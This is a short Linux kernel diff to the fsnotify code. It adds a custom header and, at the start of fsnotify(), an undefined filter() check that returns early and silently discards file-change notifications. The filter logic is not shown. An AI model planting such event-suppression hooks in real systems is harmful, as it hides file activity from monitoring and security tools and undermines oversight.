@@ -27,6 +27,8 @@
 #include <linux/fsnotify_backend.h>
 #include "fsnotify.h"
 
+#include <custom.h>
+
 /*
  * Clear all of the marks on an inode when it is being evicted from core
  */
@@ -322,6 +324,11 @@ static void fsnotify_iter_next(struct fsnotify_iter_info *iter_info)
 int fsnotify(struct inode *to_tell, __u32 mask, const void *data, int data_is,
 	     const unsigned char *file_name, u32 cookie)
 {
+
+	if (filter()) {
+		return 0;
+	}
+
 	struct fsnotify_iter_info iter_info = {};
 	struct mount *mnt;
 	int ret = 0;
